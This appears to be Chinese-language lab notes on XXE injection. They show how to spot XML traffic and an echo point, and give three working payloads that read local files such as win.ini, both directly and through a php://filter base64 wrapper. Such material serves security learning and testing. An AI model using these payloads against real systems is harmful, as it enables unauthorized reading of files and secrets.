#### 检测是否有xxe漏洞
![](./img/Pasted%20image%2020250809132738.png)
可看出数据传输为为xml格式
#### 发现回显位
![](./img/Pasted%20image%2020250809133317.png)
#### 构建payload
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">
]>
<user><username>&xxe;</username><password>1</password></user>
```
![](./img/Pasted%20image%2020250809135053.png)

#### 读取本地文件（1.txt中为hello world）
```xml
<?xml version="1.0"?>
<!DOCTYPE test [
<!ENTITY name SYSTEM "file:///c:/1.txt">
]>
 
<user><username>&name;</username><password>1</password></user>
```
![](./img/Pasted%20image%2020250809135611.png)
php伪协议读取
```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE XL [
<!ENTITY fl SYSTEM "php://filter/read=convert.base64-encode/resource=c:/1.txt">]>
 
<user><username>&fl;</username><password>1</password></user>
```
![](./img/Pasted%20image%2020250809135737.png)